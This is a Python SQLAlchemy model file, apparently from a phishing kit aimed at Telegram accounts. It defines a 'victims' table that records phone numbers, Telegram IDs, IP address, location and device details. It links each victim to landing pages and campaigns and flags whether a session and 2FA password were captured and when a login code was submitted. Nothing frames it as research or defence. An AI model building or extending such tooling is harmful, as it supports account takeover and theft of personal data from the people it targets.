from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, Text
from sqlalchemy.sql import func
from core.database import Base


class Victim(Base):
    __tablename__ = 'victims'

    id = Column(Integer, primary_key=True)
    phone = Column(String(20), nullable=False, index=True)
    tg_id = Column(String(20), nullable=True)
    username = Column(String(50), nullable=True)
    first_name = Column(String(100), nullable=True)
    ip = Column(String(45), nullable=True)
    country = Column(String(50), nullable=True)
    city = Column(String(100), nullable=True)
    device = Column(String(100), nullable=True)
    os = Column(String(50), nullable=True)
    browser = Column(String(50), nullable=True)
    user_agent = Column(Text, nullable=True)
    landing_id = Column(Integer, ForeignKey('landing_pages.id'), nullable=True)
    campaign_id = Column(Integer, ForeignKey('campaigns.id'), nullable=True)
    session_captured = Column(Boolean, default=False)
    twofa_captured = Column(Boolean, default=False)
    status = Column(String(20), default='visited')
    first_visit_at = Column(DateTime, server_default=func.now())
    code_submitted_at = Column(DateTime, nullable=True)
    login_at = Column(DateTime, nullable=True)
